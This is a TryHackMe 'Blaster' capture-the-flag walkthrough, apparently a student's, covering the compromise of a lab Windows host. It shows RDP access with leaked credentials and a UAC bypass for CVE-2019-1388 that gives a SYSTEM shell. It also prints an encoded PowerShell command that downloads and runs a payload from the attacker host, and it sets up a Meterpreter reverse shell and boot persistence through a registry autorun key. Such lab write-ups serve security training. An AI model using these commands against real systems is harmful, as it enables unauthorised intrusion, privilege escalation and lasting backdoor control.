# Blaster


## Task 1 Mission Start!
```
export IP=10.10.239.105
```



## Task 2 Activate Forward Scanners and Launch Proton Torpedoes
1. How many ports are open on our target system?
```
2
```
```
jeffrowell@kali:~/Documents/TryHackMe/Blaster$ nmap -sC -sV -Pn -n $IP -oN nmap/initial.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-17 13:50 MDT
Nmap scan report for 10.10.239.105
Host is up (0.14s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-05-17T19:50:26+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-05-16T19:45:33
|_Not valid after:  2020-11-15T19:45:33
|_ssl-date: 2020-05-17T19:50:28+00:00; -31s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: -30s, deviation: 0s, median: -31s
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.77 seconds
```

2. Looks like there's a web server running, what is the title of the page we discover when browsing to it?
```
IIS Windows Server
```

3. Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?
```
/retro
```
```bash
jeffrowell@kali:~/Documents/TryHackMe/Blaster$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.239.105
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/17 13:52:06 Starting gobuster
===============================================================
/retro (Status: 301)
```

4. Navigate to our discovered hidden directory, what potential username do we discover?
```
Wade
```
```
http://10.10.239.105/retro/ > http://10.10.239.105/retro/index.php/author/wade/ > http://10.10.239.105/retro/index.php/2019/12/09/ready-player-one/#comment-2
```
```
Wade
December 9, 2019
Leaving myself a note here just in case I forget how to spell it: parzival
```

5. Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?
```
parzival
```

6. Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?
```bash
jeffrowell@kali:~/Documents/TryHackMe/Blaster$ xfreerdp -u wade -d RETROWEB -p parzival $IP
```
![rdp](https://user-images.githubusercontent.com/32188816/82159140-67d0e780-9849-11ea-9c48-3aef702f239b.png)

  Open up `user.txt`:

  ![rdp_user txt](https://user-images.githubusercontent.com/32188816/82159155-8800a680-9849-11ea-9be9-9ff5f7e303b5.png)




## Task 3 Breaching the Control Room

1. When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?
```
CVE-2019-1388
```
Looking around on the system the Recycling Bin is not empty. In there, we find an executable named  `hhupd`. A simple Google search for "hhupd cves" gives us the CVE.

 ![hhupd](https://user-images.githubusercontent.com/32188816/82159519-e169d500-984b-11ea-8505-188527a5976c.png)


2. Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?
As noted above, the executable name is:
```
hhupd
```

3. Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!
This is a local privesc bug in Windows that leverages the user account control dialogue. The bug is that when attempting to run the `hhupd` executable from cmd prompt, it requires Administrator access.

  However we do not have admin access, so we are prompted by the following screen when trying to run `hhupd` from the cmd prompt:

  ![needadmin](https://user-images.githubusercontent.com/32188816/82159645-ee3af880-984c-11ea-85f4-7f61780f7abb.png)

  If we click on "Show information about the publisher's certificate", the account control dialogue will bring us to the cert information window, where we can click on the "Issued By" link to view the certificate publisher information in a browser:

    ![cetpub](https://user-images.githubusercontent.com/32188816/82159688-4f62cc00-984d-11ea-841c-265247e6558d.png)

    This will attempt to open a page in the browser window, where a 404 error occurs. If we go to `Settings > File > Save As` we are prompted with the following error message:

    ![error](https://user-images.githubusercontent.com/32188816/82159754-e2036b00-984d-11ea-8baf-3369f4828d56.png)

    Once here, we can dismiss the error message and search the file system for `cmd.exe`. Once found, we can right click `cmd.exe` and select `Open`, and this will run an Administrator command prompt for us:

    ![cmd exe](https://user-images.githubusercontent.com/32188816/82159837-7a015480-984e-11ea-971a-5af4b738a43e.png)

    As we can see, we know have admin access on the command prompt:

    ![admin](https://user-images.githubusercontent.com/32188816/82159878-bb91ff80-984e-11ea-9e78-02e6c34d29e5.png)

4. Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?
As seen in the capture above, we are now running as:
```
nt authority\system
```

5. Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!
```
THM{COIN_OPERATED_EXPLOITATION}
```
![root_flag](https://user-images.githubusercontent.com/32188816/82160014-8b972c00-984f-11ea-82af-b8e104e32a3a.png)


## Task 4 Adoption into the Collective


1. Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
```bash
msf5 > use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > show options
```


2. First, let's set the target to PSH (PowerShell). Which target number is PSH?
  ```
  2
  ```
  ```bash
  msf5 exploit(multi/script/web_delivery) > set target PSH
  target => PSH
  msf5 exploit(multi/script/web_delivery) > show options
  Module options (exploit/multi/script/web_delivery):
     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
     SRVPORT  8080             yes       The local port to listen on.
     SSL      false            no        Negotiate SSL for incoming connections
     SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
     URIPATH                   no        The URI to use for this exploit (default is random)
  Payload options (python/meterpreter/reverse_tcp):
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST                   yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
  Exploit target:
     Id  Name
     --  ----
     2   PSH
  ```


3. After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.
```bash
msf5 exploit(multi/script/web_delivery) > set LHOST 10.8.21.42
LHOST => 10.8.21.42
```

4. Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.
```bash
msf5 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf5 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/script/web_delivery) >
[*] Started HTTP reverse handler on http://10.8.21.42:4444
[*] Using URL: http://0.0.0.0:8080/IvrxNuSIuDrm05
[*] Local IP: http://10.0.0.52:8080/IvrxNuSIuDrm05
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABKAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAEoALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADIAMQAuADQAMgA6ADgAMAA4ADAALwBJAHYAcgB4AE4AdQBTAEkAdQBEAHIAbQAwADUAJwApACkAOwA=
```


5. Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned.
  ```bash
  [*] 10.10.239.105    web_delivery - Delivering Payload (3316) bytes
  [*] http://10.8.21.42:4444 handling request from 10.10.239.105; (UUID: 8majmaf9) Staging x86 payload (181337 bytes) ...
  [*] Meterpreter session 1 opened (10.8.21.42:4444 -> 10.10.239.105:50028) at 2020-05-17 15:13:30 -0600
  ```
  ```bash
  msf5 exploit(multi/script/web_delivery) > sessions

  Active sessions
  ===============

    Id  Name  Type                     Information                     Connection
    --  ----  ----                     -----------                     ----------
    1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWEB  10.8.21.42:4444 -> 10.10.239.105:50028 (10.10.239.105)
  ```

6. Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup.
```
run persistence -X
```
```bash
  msf5 exploit(multi/script/web_delivery) > sessions 1
  [*] Starting interaction with 1...

  meterpreter > run persistence -h

  [!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
  [!] Example: run exploit/windows/local/persistence OPTION=value [...]
  Meterpreter Script for creating a persistent backdoor on a target host.

  OPTIONS:

      -A        Automatically start a matching exploit/multi/handler to connect to the agent
      -L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
      -P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
      -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
      -T <opt>  Alternate executable template to use
      -U        Automatically start the agent when the User logs on
      -X        Automatically start the agent when the system boots
      -h        This help menu
      -i <opt>  The interval in seconds between each connection attempt
      -p <opt>  The port on which the system running Metasploit is listening
      -r <opt>  The IP of the system running Metasploit listening for the connect back
```


7. Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!
  ```bash
  meterpreter > run persistence -X

  [!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
  [!] Example: run exploit/windows/local/persistence OPTION=value [...]
  [*] Running Persistence Script
  [*] Resource file for cleanup created at /home/jeffrowell/.msf4/logs/persistence/RETROWEB_20200517.3253/RETROWEB_20200517.3253.rc
  [*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.0.0.52 LPORT=4444
  [*] Persistent agent script is 99636 bytes long
  [+] Persistent Script written to C:\Windows\TEMP\JnySoaxO.vbs
  [*] Executing script C:\Windows\TEMP\JnySoaxO.vbs
  [+] Agent executed with PID 4364
  [*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MmqMfhiUfDn
  [+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MmqMfhiUfDn
  ```
